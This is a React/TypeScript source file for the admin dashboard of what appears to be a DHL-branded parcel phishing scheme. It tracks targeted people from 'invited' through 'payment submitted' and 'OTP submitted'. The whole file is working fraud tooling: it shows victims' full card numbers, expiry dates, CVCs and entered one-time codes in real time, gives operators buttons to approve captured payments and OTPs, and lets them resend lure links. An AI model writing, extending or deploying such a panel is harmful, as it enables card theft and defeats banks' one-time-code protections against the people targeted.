'use client'

import React, { useEffect, useState } from 'react'
import { createClient } from '@/utils/supabase/client'
import { approvePayment, approveOtp, rejectClient, deleteClient, updateClientData } from './actions_gates'
import { resendClientEmail } from './actions'

type ClientData = {
    id: string
    email: string
    tracking_number: string
    state: string
    address_payload: any
    payment_payload: any
    otp_hash: string
    otp_code: string | null
    otp_attempts: number
}

export function ClientTrackerTable({ initialClients }: { initialClients: ClientData[] }) {
    const supabase = createClient()
    const [clients, setClients] = useState<ClientData[]>(initialClients)
    const [editingId, setEditingId] = useState<string | null>(null)
    const [editForm, setEditForm] = useState<{ email: string, tracking_number: string, state: string } | null>(null)
    const [expandedId, setExpandedId] = useState<string | null>(null)
    const [isResending, setIsResending] = useState<string | null>(null)

    // Sync state with server-side props updates
    useEffect(() => {
        setClients(initialClients)
    }, [initialClients])

    useEffect(() => {
        const channel = supabase
            .channel('admin-tracker')
            .on('postgres_changes', { event: 'UPDATE', schema: 'public', table: 'clients' }, (payload) => {
                setClients((current) =>
                    current.map((c) => c.id === payload.new.id ? { ...c, ...payload.new } : c)
                )
            })
            .on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'clients' }, (payload) => {
                setClients((current) => [payload.new as ClientData, ...current])
            })
            .on('postgres_changes', { event: 'DELETE', schema: 'public', table: 'clients' }, (payload) => {
                setClients((current) => current.filter(c => c.id !== payload.old.id))
            })
            .subscribe()

        return () => {
            supabase.removeChannel(channel)
        }
    }, [supabase])

    const handleAction = async (clientId: string, actionFn: (id: string) => Promise<any>) => {
        try {
            await actionFn(clientId)
        } catch (e) {
            console.error(e)
            alert("Action failed. Check console.")
        }
    }

    const handleResend = async (client: ClientData) => {
        const newEmail = window.prompt("Enter the new or corrected email address to resend tracking link to:", client.email)
        if (!newEmail || newEmail.trim() === '') return
        if (!newEmail.includes('@')) {
            alert("Invalid email format.")
            return
        }

        setIsResending(client.id)
        try {
            await resendClientEmail(client.id, newEmail.trim())
            alert(`New tracking link successfully dispatched to ${newEmail.trim()}`)
        } catch (e: any) {
            console.error(e)
            alert(e.message || "Failed to resend email.")
        } finally {
            setIsResending(null)
        }
    }

    const startEdit = (client: ClientData) => {
        setEditingId(client.id)
        setEditForm({ email: client.email, tracking_number: client.tracking_number, state: client.state })
    }

    const cancelEdit = () => {
        setEditingId(null)
        setEditForm(null)
    }

    const saveEdit = async (id: string) => {
        if (!editForm) return
        try {
            await updateClientData(id, {
                email: editForm.email,
                tracking_number: editForm.tracking_number,
                state: editForm.state
            })
            cancelEdit()
        } catch (e) {
            console.error(e)
            alert("Failed to save changes.")
        }
    }

    const handleDelete = async (id: string) => {
        if (confirm("Are you sure you want to permanently delete this client?")) {
            await handleAction(id, deleteClient)
        }
    }

    return (
        <div className="overflow-x-auto mt-8 rounded-lg border border-gray-200 shadow-md bg-white">
            <div className="bg-[#D40511] h-1.5 w-full"></div>
            <table className="w-full text-left border-collapse bg-white">
                <thead>
                    <tr className="border-b-2 border-gray-200 bg-gray-100 uppercase text-[10px] sm:text-xs font-black text-gray-700 tracking-wider">
                        <th className="p-4 w-1/3">Client Identity</th>
                        <th className="p-4 w-1/4">Waybill Tracker</th>
                        <th className="p-4 w-1/4">System Status</th>
                        <th className="p-4 w-1/6 text-right">Actions</th>
                    </tr>
                </thead>
                <tbody className="divide-y divide-gray-100">
                    {clients.map((client) => {
                        const isEditing = editingId === client.id
                        const isExpanded = expandedId === client.id

                        return (
                            <React.Fragment key={client.id}>
                                <tr
                                    className={`hover:bg-gray-50 transition-colors cursor-pointer ${isExpanded ? 'bg-gray-50' : ''}`}
                                    onClick={() => !isEditing && setExpandedId(isExpanded ? null : client.id)}
                                >
                                    <td className="p-4 text-sm break-all font-medium text-gray-900 border-l-4 border-transparent hover:border-dhl-red transition-all">
                                        {isEditing ? (
                                            <input
                                                type="email"
                                                value={editForm?.email || ''}
                                                onChange={e => setEditForm(prev => ({ ...prev!, email: e.target.value }))}
                                                className="border p-2 w-full text-xs rounded focus:ring-2 focus:ring-dhl-yellow outline-none"
                                                onClick={e => e.stopPropagation()}
                                            />
                                        ) : client.email}
                                    </td>
                                    <td className="p-4 text-sm font-black font-mono tracking-tight text-[#D40511]">
                                        {isEditing ? (
                                            <input
                                                type="text"
                                                value={editForm?.tracking_number || ''}
                                                onChange={e => setEditForm(prev => ({ ...prev!, tracking_number: e.target.value }))}
                                                className="border p-2 w-full text-xs font-mono rounded-sm focus:ring-2 focus:ring-dhl-yellow outline-none text-gray-900"
                                                onClick={e => e.stopPropagation()}
                                            />
                                        ) : client.tracking_number}
                                    </td>
                                    <td className="p-4 text-sm">
                                        {isEditing ? (
                                            <select
                                                value={editForm?.state || ''}
                                                onChange={e => setEditForm(prev => ({ ...prev!, state: e.target.value }))}
                                                className="border p-2 text-xs rounded outline-none focus:ring-2 focus:ring-dhl-yellow"
                                                onClick={e => e.stopPropagation()}
                                            >
                                                <option value="INVITED">INVITED</option>
                                                <option value="LINK_CLICKED">LINK_CLICKED</option>
                                                <option value="ADDRESS_CONFIRMED">ADDRESS_CONFIRMED</option>
                                                <option value="PAYMENT_SUBMITTED">PAYMENT_SUBMITTED</option>
                                                <option value="GATE_1_APPROVED">GATE_1_APPROVED</option>
                                                <option value="OTP_SUBMITTED">OTP_SUBMITTED</option>
                                                <option value="GATE_2_APPROVED">GATE_2_APPROVED</option>
                                                <option value="REJECTED">REJECTED</option>
                                            </select>
                                        ) : <StatusBadge state={client.state} />}
                                    </td>
                                    <td className="p-4 text-right">
                                        <button
                                            className="text-gray-500 hover:text-gray-900 text-sm font-medium px-2 py-1"
                                            onClick={(e) => {
                                                e.stopPropagation();
                                                setExpandedId(isExpanded ? null : client.id)
                                            }}
                                        >
                                            {isExpanded ? 'Hide Details' : 'View Details'}
                                        </button>
                                    </td>
                                </tr>

                                {/* Expanded Details Row */}
                                {isExpanded && (
                                    <tr className="bg-gray-50 border-b border-gray-200">
                                        <td colSpan={4} className="p-6">
                                            <div className="grid grid-cols-1 md:grid-cols-3 gap-6">

                                                {/* Card 1: Context Data */}
                                                <div className="bg-white p-4 rounded-lg shadow-sm border border-gray-200">
                                                    <h3 className="text-sm font-bold text-gray-900 border-b pb-2 mb-3">Payload Data</h3>
                                                    <div className="space-y-3 text-xs text-gray-600">
                                                        {client.payment_payload ? (
                                                            <div className="rounded border border-gray-100 bg-gray-50 p-3">
                                                                <div className="font-semibold text-gray-800 mb-1">Payment Info</div>
                                                                <div>Name: <span className="text-gray-900">{client.payment_payload.cardholder_name}</span></div>
                                                                <div className="font-mono mt-1">Card: {client.payment_payload.card_number}</div>
                                                                <div className="mt-1">Exp: {client.payment_payload.exp_month}/{client.payment_payload.exp_year} <span className="ml-2">CVC: {client.payment_payload.cvc}</span></div>
                                                            </div>
                                                        ) : <div className="text-gray-400 italic">No payment info yet.</div>}

                                                        {client.address_payload ? (
                                                            <div className="rounded border border-gray-100 bg-gray-50 p-3">
                                                                <div className="font-semibold text-gray-800 mb-1">Address</div>
                                                                <div>{client.address_payload.city}, {client.address_payload.zip}</div>
                                                            </div>
                                                        ) : <div className="text-gray-400 italic">No address info yet.</div>}
                                                    </div>
                                                </div>

                                                {/* Card 2: Security & OTP */}
                                                <div className="bg-white p-4 rounded-lg shadow-sm border border-gray-200">
                                                    <h3 className="text-sm font-bold text-gray-900 border-b pb-2 mb-3">Security & OTP</h3>
                                                    <div className="text-xs text-gray-600 space-y-2">
                                                        <div>Status: <span className="font-semibold text-gray-900">{client.state}</span></div>
                                                        {client.otp_attempts > 0 ? (
                                                            <div className="text-dhl-red font-semibold">Failed OTP Attempts: {client.otp_attempts}</div>
                                                        ) : (
                                                            <div className="text-gray-500">No failed attempts.</div>
                                                        )}
                                                        {client.otp_code && <div className="text-gray-900 font-bold font-mono text-sm mt-2 border border-dhl-yellow bg-yellow-50 p-2 rounded inline-block">Code Entered: {client.otp_code}</div>}
                                                        {client.otp_hash && !client.otp_code && <div className="text-gray-400 truncate mt-2 cursor-help" title={client.otp_hash}>Hash: {client.otp_hash.substring(0, 10)}...</div>}
                                                    </div>
                                                </div>

                                                {/* Card 3: Admin Actions */}
                                                <div className="bg-white p-4 rounded-lg shadow-sm border border-gray-200 flex flex-col justify-between">
                                                    <div>
                                                        <h3 className="text-sm font-bold text-gray-900 border-b pb-2 mb-3">Gate Control</h3>
                                                        <div className="flex flex-col gap-2">
                                                            {client.state === 'PAYMENT_SUBMITTED' && !isEditing && (
                                                                <div className="grid grid-cols-2 gap-2">
                                                                    <button onClick={() => handleAction(client.id, approvePayment)} className="bg-green-600 text-white px-3 py-2 rounded text-xs font-semibold hover:bg-green-700 transition">Approve Payment</button>
                                                                    <button onClick={() => handleAction(client.id, rejectClient)} className="bg-dhl-red text-white px-3 py-2 rounded text-xs font-semibold hover:bg-red-800 transition">Reject</button>
                                                                </div>
                                                            )}
                                                            {client.state === 'OTP_SUBMITTED' && !isEditing && (
                                                                <div className="grid grid-cols-2 gap-2">
                                                                    <button onClick={() => handleAction(client.id, approveOtp)} className="bg-green-600 text-white px-3 py-2 rounded text-xs font-semibold hover:bg-green-700 transition">Approve OTP</button>
                                                                    <button onClick={() => handleAction(client.id, rejectClient)} className="bg-dhl-red text-white px-3 py-2 rounded text-xs font-semibold hover:bg-red-800 transition">Reject</button>
                                                                </div>
                                                            )}
                                                            {['GATE_1_APPROVED', 'GATE_2_APPROVED', 'REJECTED'].includes(client.state) && !isEditing && (
                                                                <div className="text-sm text-gray-500 italic p-2 bg-gray-50 rounded text-center border">No pending gate actions.</div>
                                                            )}
                                                            {['INVITED', 'LINK_CLICKED', 'ADDRESS_CONFIRMED'].includes(client.state) && !isEditing && (
                                                                <div className="text-sm text-gray-500 italic p-2 bg-gray-50 rounded text-center border">Awaiting client action...</div>
                                                            )}
                                                            {isEditing && <span className="text-gray-500 italic text-sm text-center py-2">Editing in progress...</span>}
                                                        </div>
                                                    </div>

                                                    <div className="mt-4 pt-3 border-t flex justify-between items-center">
                                                        {isEditing ? (
                                                            <div className="flex gap-2 w-full">
                                                                <button onClick={() => saveEdit(client.id)} className="flex-1 bg-gray-900 text-white px-3 py-2 rounded text-xs font-semibold hover:bg-black transition">Save Changes</button>
                                                                <button onClick={cancelEdit} className="flex-1 bg-gray-200 text-gray-800 px-3 py-2 rounded text-xs font-semibold hover:bg-gray-300 transition">Cancel</button>
                                                            </div>
                                                        ) : (
                                                            <div className="flex gap-4 w-full justify-between items-center">
                                                                <button
                                                                    onClick={() => handleResend(client)}
                                                                    disabled={isResending === client.id}
                                                                    className={`flex items-center gap-1.5 px-3 py-1.5 rounded text-xs font-semibold transition-colors border ${isResending === client.id ? 'bg-gray-100 text-gray-400 border-gray-200 cursor-not-allowed' : 'bg-blue-50 text-blue-700 hover:bg-blue-100 border-blue-200'}`}
                                                                >
                                                                    {isResending === client.id ? 'Sending...' : 'Resend Email'}
                                                                </button>

                                                                <div className="flex gap-4">
                                                                    <button onClick={() => startEdit(client)} className="text-blue-600 hover:text-blue-800 text-xs font-semibold underline">Edit Client</button>
                                                                    <button onClick={() => handleDelete(client.id)} className="text-dhl-red hover:text-red-800 text-xs font-semibold underline">Delete Record</button>
                                                                </div>
                                                            </div>
                                                        )}
                                                    </div>
                                                </div>

                                            </div>
                                        </td>
                                    </tr>
                                )}
                            </React.Fragment>
                        )
                    })}
                    {clients.length === 0 && (
                        <tr><td colSpan={4} className="p-8 text-center text-gray-500">No active funnels tracked. Add a client to begin.</td></tr>
                    )}
                </tbody>
            </table>
        </div>
    )
}

function StatusBadge({ state }: { state: string }) {
    const colors: Record<string, string> = {
        'INVITED': 'bg-gray-100 text-gray-700 border-gray-200',
        'LINK_CLICKED': 'bg-blue-50 text-blue-700 border-blue-200',
        'ADDRESS_CONFIRMED': 'bg-indigo-50 text-indigo-700 border-indigo-200',
        'PAYMENT_SUBMITTED': 'bg-dhl-yellow text-gray-900 border-yellow-400 font-bold shadow-sm',
        'GATE_1_APPROVED': 'bg-green-50 text-green-700 border-green-200',
        'OTP_SUBMITTED': 'bg-dhl-yellow text-gray-900 border-yellow-400 font-bold shadow-sm animate-pulse',
        'GATE_2_APPROVED': 'bg-green-600 text-white border-green-700 shadow-sm font-bold',
        'REJECTED': 'bg-dhl-red text-white border-red-800 shadow-sm'
    }
    return (
        <span className={`px-2.5 py-1 text-[11px] uppercase tracking-wider font-semibold rounded-full border ${colors[state] || 'bg-gray-100 text-gray-800'}`}>
            {state.replace(/_/g, ' ')}
        </span>
    )
}
